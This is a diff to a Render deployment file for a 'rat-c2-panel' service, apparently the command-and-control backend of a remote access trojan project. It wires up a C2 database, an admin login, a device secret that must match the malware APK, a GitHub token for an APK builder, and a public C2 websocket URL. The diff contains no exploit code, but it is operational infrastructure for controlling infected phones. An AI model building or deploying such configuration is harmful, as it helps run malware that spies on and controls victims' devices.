@@ -1,24 +1,40 @@
 services:
   - type: web
-    name: rat-c2
+    name: rat-c2-panel
     runtime: node
     plan: free
-    buildCommand: npm run build
-    startCommand: npm start
+    rootDir: backend
+    buildCommand: |
+      cd ../frontend && npm ci && npm run build
+      cd ../backend && npm ci
+    startCommand: node server.js
     healthCheckPath: /health
     envVars:
       - key: NODE_ENV
         value: production
       - key: PORT
-        value: 10000
+        value: 3000
       - key: DATABASE_URL
-        sync: false
+        fromDatabase:
+          name: rat-c2-db
+          property: connectionString
       - key: JWT_SECRET
         generateValue: true
       - key: ADMIN_USERNAME
-        sync: false
-      - key: ADMIN_PASSWORD
-        sync: false
+        value: admin
+      - key: ADMIN_PASSWORD_HASH
+        sync: false   # set manually in Render dashboard
       - key: DEVICE_SECRET
-        sync: false
+        sync: false   # set manually — must match APK
+      - key: GH_TOKEN
+        sync: false   # optional — only if using APK builder
+      - key: GH_REPO
+        value: uyrer/rat-project
+      - key: PUBLIC_C2_URL
+        value: wss://rat-c2-panel.onrender.com/ws
+
+databases:
+  - name: rat-c2-db
+    plan: free
+    databaseName: rat_c2
     
